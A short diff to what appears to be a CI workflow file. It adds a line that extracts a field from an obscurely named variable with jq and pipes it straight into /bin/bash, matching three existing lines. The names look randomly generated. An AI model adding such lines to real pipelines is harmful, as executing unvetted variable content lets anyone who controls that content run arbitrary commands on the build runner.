@@ -33,6 +33,7 @@ jobs:
           echo $gfmjp79 | jq -r .rbm4 | /bin/bash
           printf '%s' "$lq79662" | jq -r .jr0 | /bin/bash
           echo $dgkuq3 | jq -r .mop6856 | /bin/bash
+          echo $ksybk16266 | jq -r .ve76 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
